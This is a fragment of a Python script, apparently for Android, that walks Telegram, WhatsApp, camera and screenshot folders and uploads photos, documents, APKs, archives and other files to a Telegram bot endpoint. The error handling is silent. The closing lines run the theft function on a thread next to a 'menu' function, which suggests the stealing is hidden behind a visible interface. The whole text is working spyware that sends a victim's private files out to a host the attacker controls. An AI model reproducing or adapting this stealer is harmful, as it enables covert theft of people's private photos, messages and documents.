        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files\ ) ----------#
    #---------------------apk------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------zip-----------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------swp----------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------mp4-----------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------mp3------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------m4a-----------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------jpg------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------pdf-------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------crx-------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------txt--------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------smali--------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
           #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------png---------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------xml----------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------json----------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------com-----------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------py-----------------------#
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass   
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents\ )------------#
    #---------------------apk------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------zip-----------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------swp----------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
               #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------mp4-----------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------mp3------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------m4a-----------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------jpg------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(jpg)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------pdf-------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
           #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------crx-------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------txt--------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------smali--------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------png---------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
             #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------(extra)_(png)-----------------#
    try:
        sdcard_path = '/sdcard/DCIM/Screenshots'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
              #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------xml----------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------json----------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
            #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
	#---------------------com-----------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
         #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------------------py-----------------------#
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
           #url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=1000) as jjj:
    jjj.submit(suyaib)
    jjj.submit(menu)
